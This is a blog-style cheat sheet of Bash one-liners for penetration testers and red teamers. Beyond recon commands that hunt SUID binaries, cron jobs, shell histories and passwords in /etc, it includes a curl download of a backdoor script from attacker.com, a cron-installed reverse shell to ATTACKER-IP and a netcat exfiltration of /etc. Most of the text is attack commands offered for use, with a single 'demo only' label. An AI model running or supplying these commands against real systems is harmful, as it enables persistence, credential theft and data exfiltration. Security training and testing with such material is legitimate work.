15+ Linux Bash One-Liners Hackers Use (And You Should Too!)
Very Lazy Tech 👾
Very Lazy Tech 👾

Follow
3 min read
·
Jul 30, 2025
298


2





✨ Link in the first comment

Linux power users and ethical hackers know the true power of the terminal lies in concise, clever one-liners. These one-liners can automate tasks, extract hidden data, escalate privileges, scan systems, and much more — all in a single line of Bash.

Below, we share over 15 elite Bash one-liners that every penetration tester, red teamer, or Linux enthusiast should add to their toolbox.

Press enter or click to view image in full size

Photo by Gabriel Heinzer on Unsplash
🔥 Core Info Gathering & Recon
1. Start a Quick Web Server (for file transfers/payloads)

python3 -m http.server 8080
Use this to exfil data, serve payloads, or quickly download tools to a compromised host. No setup required.

2. Find All SUID Binaries (Privilege Escalation)

find / -perm -4000 -type f 2>/dev/null
Look for binaries that execute as root. Combine this with GTFOBins to exploit.

3. List All Cron Jobs Across Users

for user in $(cut -d: -f1 /etc/passwd); do crontab -u $user -l 2>/dev/null; done
Perfect for persistence discovery and privilege escalation.

4. Basic Port Scan with Bash (when tools are restricted)

for port in {20..1024}; do (echo >/dev/tcp/10.10.10.5/$port) && echo "Port $port open"; done 2>/dev/null
Sure, nmap is better — but when you’re stuck without tools, this works.

5. Check All Network Interfaces + IPs

ip a | grep inet
Fast view of IPs — especially useful inside isolated subnets or pivoted hosts.

🕵️‍♂️ Enumeration & Post-Exploitation
6. List Users (and spot service/system accounts)

cut -d: -f1 /etc/passwd
7. Discover World-Writable Files (misconfig alert!)

find / -type f -perm -o+w 2>/dev/null
8. Search for Passwords or Secrets in Config Files

grep -iR 'password\|secret\|key\|token' /etc 2>/dev/null
9. Monitor Real-Time Network Connections

watch -n 1 ss -tuna
Much lighter than netstat, useful for catching beaconing or reverse shells.

10. View Bash History Across All Users

find /home /root -name ".*history" -exec cat {} \; 2>/dev/null
Critical for finding past credentials, missteps, or recon clues from admins.

🧠 Data Extraction & Movement
11. Transfer Files to Remote Machine over SSH

scp payload.sh user@192.168.1.5:/tmp
Use scp for secure movement of tools between footholds.

12. Transfer & Extract Compressed Payloads On-the-Fly

tar czf - /loot | ssh user@remote "tar xzf - -C /tmp"
Saves disk space. No temporary files. Instant deployment.

13. Grab Email Addresses from a File System

grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,6}" * 2>/dev/null | sort -u
14. Extract Unique IPs from Logs (Quick Threat Intel)

grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /var/log/* 2>/dev/null | sort -u
15. Download File Silently with Curl (Payloads, Tools)

curl -sO http://attacker.com/backdoor.sh
💣 Persistence, Priv-Esc & Lateral Movement
16. Add a Backdoor Reverse Shell to Cron (Demo only)

echo "* * * * * bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1" | crontab -
17. Find Writable Directories (Good for Dropping Files)

find / -type d -writable 2>/dev/null
18. Compress and Exfiltrate via Netcat (Old but gold)

tar czf - /etc | nc ATTACKER-IP 1234
Start listener on attack box: nc -lvp 1234 > data.tar.gz

19. Check for Running Docker Containers (Escape Paths)

docker ps -a 2>/dev/null
Can lead to container escape or horizontal movement inside Kubernetes.

20. Get Root’s Mail (Yes, people still leave secrets there)

cat /var/mail/root 2>/dev/null
🎭 Obfuscation, Encoding, Decryption
21. Decode Base64 Payloads

echo 'U29ja3M=' | base64 -d
22. Convert Hex to ASCII (Useful for C2 traffic)

echo 4861636b | xxd -r -p
23. Generate Strong Passwords Fast

tr -dc A-Za-z0-9 </dev/urandom | head -c 16; echo
24. Check System Info in One Shot (Pivot Context)

whoami && uname -a && id && uptime
🎉 Join the VeryLazyTech community today and level up your skills! 🎉

Become VeryLazyTech member! 🎁

Follow us on:

✖ Twitter @VeryLazyTech.
👾 Github @VeryLazyTech.
📜 Medium @VeryLazyTech.
📺 YouTube @VeryLazyTech.
📩 Telegram @VeryLazyTech.
🕵️‍♂️ My Site @VeryLazyTech.
Visit our shop for e-books and courses. 📚
